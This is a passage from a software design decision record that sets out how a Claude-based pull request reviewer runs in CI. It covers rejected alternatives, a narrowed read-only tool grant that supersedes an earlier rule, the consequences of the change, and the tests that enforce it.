Recorded because two of them would have been cheaper than what was built, and a
Decision that omits that is not an honest record.

**Filtering the comments instead of removing them.** The action accepts
`exclude_comments_by_actor`, with wildcards such as `*[bot]`. On the Pull Request where
the reviewer first failed, the volume was almost entirely bot reviewers repeating long
summaries, so one line would very likely have restored it **without changing modes at
all**. It was not taken for two reasons. It filters rather than bounds: enough human
comments reach the same wall, so the failure returns rather than ends. And it keeps tag
mode, which the action runs with `--permission-mode acceptEdits` and
`Bash(git add|commit|rm)` plus a push wrapper -- write access to the working tree and to
the repository, in a job holding the credential. Agent mode's exposure is smaller, not
larger; the tool grant that had to be added back for retrieval is gone entirely as of
rule 12.

**`--max-turns` alone.** A turn cap bounds accumulation during a session but not what
the session begins with, which is what actually failed. It is adopted as rule 24
alongside the prompt bound rather than instead of it.

**An unprivileged producer with a privileged consumer.** CodeQL's own query
documentation endorses this as an alternative to not checking out at all, and it would
recover the post-change file state that rule 21 gives up. It is not taken here because
for `pull_request` events the producing workflow comes from the candidate's own head, so
its artifact is contributor-controlled and the `upload-artifact` digest proves only that
it arrived unaltered, not that it is honest. Verifying each file against the
comparison's blob `sha` would close that, and it is captured as a tracked Work Item
rather than implemented under this Decision.

**Collecting the base revision of every changed file.** Rule 21 removes the candidate
tree, and the checkout that remains is the default branch, so the reviewer has no exact
pre-change state for a file whose changed region the diff shows only in part. Fetching
those bytes from the provider at the merge base would recover it. It is a separate
capability with its own failure modes -- a per-file request budget, the contents API
resolving a symlink to its target's bytes under an ordinary `type: file`, large blobs
returned with `encoding: "none"`, submodules, and renames whose base bytes live under
the previous path -- and it is deferred to a follow-on slice rather than carried here,
so this Decision's boundary can be reviewed on its own. Until then the prompt states the
gap to the reviewer instead of letting the checkout stand in for it.

**Per-file review with relevance filtering.** The published pattern for large changes is
retrieval of the relevant parts rather than the whole diff under a cap, and smaller
models are reported to lose accuracy when given too much. This Decision bounds the whole
and lets the reviewer page through `patches/`; bounding per file instead is a different
shape and is not admitted here.

## Partial supersession of Decision 0093 rule 8

Decision 0093 rule 8 requires that `allowed_bots`, `allowed_non_write_users`,
`assignee_trigger` **and extra mention-job tools** be left unset. Rule 12 grants no
Bash and no git of any shape -- an earlier revision of this Decision granted a git
wrapper and that grant is gone -- so what overrides the tool clause is narrower than
it once was: the read-only filesystem tools `Read`, `Grep` and `Glob`, and the
read-only CI inspection tools of rule 16. Retrieval happens in a trusted workflow step
instead of through any grant.

This is recorded rather than left implicit because the alternative is two
contradictory security contracts in the same repository, and because a test
asserting it enforces "every Decision 0093 invariant" would then be false.

What is superseded is narrow:

- **superseded:** the "extra mention-job tools unset" clause, and only for
  `Read`, `Grep`, `Glob`, `mcp__github_ci__get_ci_status`,
  `mcp__github_ci__get_workflow_run_details` and
  `mcp__github_ci__download_job_log`. A granted tool absent from this list would
  leave rule 8 and rule 16 demanding opposite things for it, so the contract test
  requires every tool in `--allowedTools` to appear here. No raw `git` prefix is
  granted, and rule 12 records why a prefix would not be read-only;
- **retained:** `allowed_bots`, `allowed_non_write_users` and `assignee_trigger`
  stay unset, and no write-capable tool is granted. Rule 8's intent is in fact
  **strengthened** rather than weakened on tools: no `Bash` is granted at all, of
  any shape, because a granted command is run through a shell. Rule 12 records the
  two reproduced chains that led there.

The grant exists because rule 8 predates bounded context. Tag mode supplied the
diff inside the prompt, so no tool was needed to see it; agent mode supplies no
data at all, so a reviewer with neither retrieval nor supplied context has a
checkout it cannot inspect. The retrieval is therefore moved into a trusted step
rather than granted to the reviewer.
Rule 8's intent -- no unnecessary capability in the credential-bearing job -- is
preserved by granting the smallest set that makes the design function.

## Consequences

Bounded review context becomes available on Pull Requests of any size, and the
mention path stops failing before dispatch. In exchange, a review is delivered to
the workflow run rather than to the Pull Request, and the reviewer no longer sees
the discussion, so it may re-raise a settled point as a question. Restoring inline
delivery without widening `GITHUB_TOKEN` remains open.

## What this Decision does not change

Decision 0093 rules 1 to 7; the automatic review workflow's triggers;
`GITHUB_TOKEN` scope; `allowed_bots`, `allowed_non_write_users` or
`assignee_trigger`, all of which stay unset. A Claude review remains advisory evidence. It is not reviewer
qualification under Decision 0089, does not populate a protected qualification
snapshot, and carries no approval or merge authority.

## Verification

`tests/test_claude_actions_workflows.py` enforces agent-mode selection, the
bounded interpolation set, the static prompt bound, forwarding of the triggering
request, the reviewed-head checkout binding under a same-repository guard, coverage of
every admitted trigger payload, the resolved-base diff, the declared entry route, the absence of any Bash grant, the trusted context collection with its bound
and its line-safe recoverable parts, the provider-built comparison with its cap
notices and rename handling, the absence of any base-side collection or any
candidate checkout, the sanitised report publication and the turn bound,
the no-Pull-Request path, the forwarded inline location, the trust gate on
externally authored issue text, the agreement between the tool grant and the
requested permissions, the recorded supersession, and the explicit delivery path — alongside every existing Decision 0093
invariant. The `immutable-provider-ci-adapters` guardrail owns the workflows,
both Decisions and that test.

Effectiveness is not claimed by this Decision. It is established only when a
mention on a Pull Request of #319's size completes with a non-zero
`total_cost_usd` and more than one turn.
